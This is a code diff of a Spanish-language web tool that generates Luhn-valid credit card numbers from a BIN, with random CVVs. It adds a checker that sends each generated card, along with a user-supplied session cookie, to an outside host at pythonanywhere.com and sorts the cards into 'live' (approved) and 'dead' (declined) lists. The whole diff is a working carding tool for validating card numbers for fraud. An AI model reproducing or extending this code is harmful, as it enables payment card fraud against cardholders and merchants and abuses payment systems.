@@ -120,30 +120,95 @@ particlesJS('particles-js',
 
 );
 
+
 initComponents();
 document.querySelector('#btn-generar').addEventListener('click',generarTarjetas);
+document.querySelector('#btn-buscar').addEventListener('click',buscarLives);
+let lives_cont = 0;
+let dead_cont = 0;
+let tarjetas = [];
 
 function generarTarjetas(){
-
+    let num = document.querySelector("#gen-num").value;
     let bin = document.querySelector('#gen-bin').value;
     let mes = document.querySelector('#gen-mes').value;
     let anyo = document.querySelector('#gen-anyo').value;
     let cvv = document.querySelector('#gen-cvv').value;
     let field = document.querySelector('#gen-resultado');
-    let vacio = !cvv;
 
     if(bin.length != 16){
         alert('El bin no tiene una longitud válida');
         return;
     }
+    tarjetas = [];
     field.value = '';
-    for(let i=0;i<10;++i){
-        if(vacio){
-            cvv = getRandom(100,999);
+    for(let i=0;i<num;++i){
+        let tarjeta = {
+            numero : siguienteValida(bin),
+            mes : mes,
+            anyo : anyo,
+            cvv : (cvv ? cvv : getRandom(100,900))
         }
-        field.value += siguienteValida(bin) + '│' + mes + '│' + anyo + '│' + cvv +'\n';
+        field.value += tarjeta.numero + '│' + tarjeta.mes + '│' + tarjeta.anyo + '│' + tarjeta.cvv +'\n';
+        tarjetas.push(tarjeta);
+    }
+}
+
+async function buscarLives(){
+    let cookie = document.querySelector('#cookie').value;
+    let pEstado = document.querySelector('#p-estado');
+    let lives = document.querySelector('#lives');
+    let dead = document.querySelector('#dead');
+    let hlives = document.querySelector("#lives-cont");
+    let hdead = document.querySelector('#dead-cont');
+
+    if(!cookie){
+        alert("Sin cookie es imposible buscar lives");
+        return;
+    }
+    if(tarjetas.length == 0){
+        alert("No hay tarjetas generadas");
+        return;
+    }
+
+    document.querySelector('.cheker-container').style.display = "flex";
+
+    pEstado.textContent = "Iniciando...";
+    document.querySelector(".loading").style.display = "block";
+
+    for(let i = 0; i < tarjetas.length; ++i){
+        pEstado.textContent = "Probando: " + tarjetas[i].numero + '│' + tarjetas[i].mes + '│' + tarjetas[i].anyo + '│' + tarjetas[i].cvv;
+
+        let url = `http://aaroncc.pythonanywhere.com/?numero=${tarjetas[i].numero}&mes=${tarjetas[i].mes}&anyo=${tarjetas[i].anyo}&cookie=${cookie}`;
+        
+        try{
+          const response = await fetch(url);
+          const data = await response.json();
+          if(data.resultado){
+            pEstado.textContent = "CC Live!";
+            p = document.createElement('p');
+            p.textContent = tarjetas[i].numero + '│' + tarjetas[i].mes + '│' + tarjetas[i].anyo + '│' + tarjetas[i].cvv + " Approved Card";
+            lives.appendChild(p);
+            lives_cont++;
+            hlives.textContent = "LIVES (" + lives_cont + ")";
+          }else{
+            pEstado.textContent = "CC Dead!"
+            p = document.createElement('p');
+            p.textContent = tarjetas[i].numero + '│' + tarjetas[i].mes + '│' + tarjetas[i].anyo + '│' + tarjetas[i].cvv + " Declined Card";
+            dead.appendChild(p);
+            dead_cont++;
+            hdead.textContent = "DEAD (" + dead_cont + ")";
+          }
+        }catch(error){
+
+          alert("El proceso finalizó debido a un error: Verifica que tu cookie no tenga tarjetas asociadas");
+          break;
+        }
+        
     }
     
+    pEstado.textContent = "Proceso finalizado";
+    document.querySelector(".loading").style.display = "none";
 }
 function siguienteValida(bin){
     while(true){
@@ -199,4 +264,4 @@ function getRandom(min, max) {
     min = Math.ceil(min);
     max = Math.floor(max);
     return Math.floor(Math.random() * (max - min + 1) + min);
-  }
+}
